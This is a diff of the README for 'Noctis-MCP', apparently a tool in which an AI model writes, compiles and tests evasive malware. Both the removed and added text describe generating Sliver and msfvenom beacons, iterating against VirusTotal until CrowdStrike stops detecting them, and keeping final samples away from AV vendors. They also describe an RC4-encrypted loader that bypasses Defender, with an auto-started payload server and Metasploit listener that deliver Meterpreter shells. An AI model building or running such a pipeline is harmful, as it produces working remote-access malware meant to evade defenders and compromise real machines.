@@ -238,182 +238,73 @@ Just copy the loader to your Windows VM and run it!
 
 ---
 
-## 🔧 How It Works
-
-### RAG Intelligence (Not Code Generation!)
-
-- **RAG provides:** Technique descriptions, code snippets, OPSEC guidance
-- **AI writes:** New malware code based on intelligence
-- **NOT copy-paste:** AI synthesizes techniques intelligently
-
-### Dynamic IP Handling
-
-```python
-# Works with ANY IP:
-noctis_generate_beacon("sliver", "10.0.0.5", 443)    # Private
-noctis_generate_beacon("sliver", "192.168.1.100", 8080)  # Local
-noctis_generate_beacon("sliver", "1.2.3.4", 443)     # Public
-```
-
-### Auto-Dependency Detection
-
-```c
-// In your code:
-#include "techniques/syscalls/syswhispers3.h"
-#include "techniques/sleep_obfuscation/zilean.h"
-
-// Compiler auto-detects and links:
-// - techniques/syscalls/syswhispers3.c
-// - techniques/sleep_obfuscation/zilean.c
-```
-
-### Learning System
-
-Every time you test:
-```python
-noctis_record_result("CrowdStrike", False, "hwbp_syscalls", "Worked perfectly")
-```
-
-System updates database:
-- Increases hwbp_syscalls success rate for CrowdStrike
-- Recommends this combo more often
-- Learns from YOUR real-world tests
-
----
-
 ## 📁 Project Structure
 
 ```
 Noctis-MCP/
 ├── server/
-│   ├── noctis_server.py       # Main Flask server
-│   ├── edr_intel.py            # EDR intelligence database
-│   ├── vt_tester.py            # VirusTotal integration
-│   ├── learning_tracker.py    # SQLite learning database
-│   └── rag/
-│       └── rag_engine.py       # Simple RAG (file-based)
+│   ├── noctis_server.py       # Flask API server (manages background processes)
+│   └── __init__.py
 │
 ├── noctis_mcp/
-│   └── noctis_tools.py         # 5 MCP tools
+│   └── noctis_tools.py        # 4 MCP tools for Cursor integration
 │
-├── c2_adapters/
-│   ├── sliver_adapter.py       # Sliver beacon generation
-│   └── msfvenom_adapter.py     # Msfvenom shellcode generation
+├── staged-loader/             # Stageless loader system
+│   ├── staged_loader.c        # Clean loader source (NO MSFVenom)
+│   ├── encrypt_payload.py     # RC4 encryption tool
+│   ├── setup.sh               # Manual setup script
+│   ├── README.md              # Detailed documentation
+│   ├── QUICKSTART.md          # Quick start guide
+│   └── .gitignore             # Ignores generated files
 │
-├── compilation/
-│   └── compiler.py             # MinGW wrapper with auto-deps
-│
-├── techniques/                 # ✅ Existing working code
-│   ├── syscalls/
-│   ├── injection/
-│   ├── sleep_obfuscation/
-│   ├── unhooking/
-│   └── ... (all existing techniques)
-│
-├── compiled/                   # Output binaries
-├── output/                     # Shellcode output
-├── data/                       # Learning database
-└── logs/                       # Server logs
+├── start_server.sh            # Start Noctis MCP server
+└── README.md                  # This file
 ```
 
 ---
 
 ## ⚠️  Important Notes
 
-### VirusTotal OPSEC
+### OPSEC
 
-```
-✅ DO: Test early prototypes on VT to iterate
-❌ DON'T: Test final production binary on VT
-```
+**❌ DO NOT test final loader on VirusTotal** - it shares samples with AV vendors
 
-**Why:** VT shares samples with AV vendors. Test prototypes, iterate, then compile final version and keep it OFF VirusTotal.
+**✅ Test in isolated VM environment** with Defender enabled to verify bypass
 
-### C2 Setup
+### Server Requirements
 
-**Before generating beacons:**
+- **Metasploit Framework** for msfvenom and listener
+- **MinGW-w64** for Windows cross-compilation
+- **Python 3** with Flask for MCP server
 
-1. Start Sliver server: `sliver-server`
-2. Create listener: `https --lhost <IP> --lport 443`
-3. Then generate beacon with that IP
+### Background Processes
 
-**Or use msfvenom** (no server needed):
+The system manages background processes for you:
+- HTTP server serves the encrypted payload
+- Metasploit listener catches incoming shells
+- Both run in background with tracked PIDs
 
-```python
-noctis_generate_beacon("msfvenom", "10.0.0.5", 4444)
-# Then start handler separately: msfconsole -q -x "use exploit/multi/handler"
-```
+Use `noctis_stop_servers()` to cleanly shut them down.
 
 ---
 
-## 🧪 Testing Workflow
+## 🔥 Key Features
 
-### 1. Development Phase (VT Testing OK)
+**What Makes This System Unique:**
 
-```python
-# Generate test beacon
-noctis_generate_beacon("sliver", "10.0.0.5", 443)
+- ✅ **Fully Automated:** One AI command does everything
+- ✅ **Bypasses Defender:** Clean loader (NO embedded MSFVenom)
+- ✅ **Background Management:** HTTP + MSF servers auto-start
+- ✅ **Polymorphic:** New RC4 key per build
+- ✅ **Stageless:** No multi-stage download failures
+- ✅ **Tested:** Working Meterpreter sessions confirmed
 
-# AI writes test_v1.c
-# Compile
-noctis_compile("test_v1.c", "CrowdStrike")
-
-# Test on VT
-noctis_test_binary("compiled/test_v1.exe", "CrowdStrike")
-# Result: 15% detection
-
-# Iterate - AI improves code
-# Compile test_v2.c
-noctis_compile("test_v2.c", "CrowdStrike")
-
-# Test again
-noctis_test_binary("compiled/test_v2.exe", "CrowdStrike")
-# Result: 5% detection, CrowdStrike CLEAN ✓
-```
-
-### 2. Production Phase (NO VT!)
-
-```python
-# Compile FINAL version
-noctis_compile("final_beacon.c", "CrowdStrike")
-
-# DO NOT TEST ON VT!
-
-# Test in isolated environment with real CrowdStrike
-# Then record result
-noctis_record_result("CrowdStrike", False, "hwbp_syscalls,waiting_thread_hijacking", "Full bypass confirmed")
-```
-
----
-
-## 🔥 Success Metrics
-
-**What Makes v3.0 Different:**
-
-- ✅ **Fully Automated:** Start to finish in minutes
-- ✅ **Dynamic IP:** Any IP address works
-- ✅ **RAG Intelligence:** AI writes code from real implementations
-- ✅ **Auto-Compilation:** Detects dependencies automatically
-- ✅ **Learning System:** Gets smarter with each test
-- ✅ **EDR-Specific:** Targets 10 major EDRs
-- ✅ **Production Ready:** Real beacons that connect
-
-**Not Just a Tool - It's a System:**
-
-- User gives objective
-- System generates working malware
-- System compiles it
-- System tests it (optional)
-- System learns from results
-- System gets better over time
-
----
-
-## 📞 Support
-
-- Test against your EDRs
-- Record results with `noctis_record_result()`
-- System learns and improves
+**Workflow:**
+1. User: "Generate stageless loader for [IP]:[PORT]"
+2. AI calls MCP tool
+3. System generates + compiles + starts servers
+4. User copies loader to Windows
+5. User runs loader → Meterpreter shell!
 
 ---
 
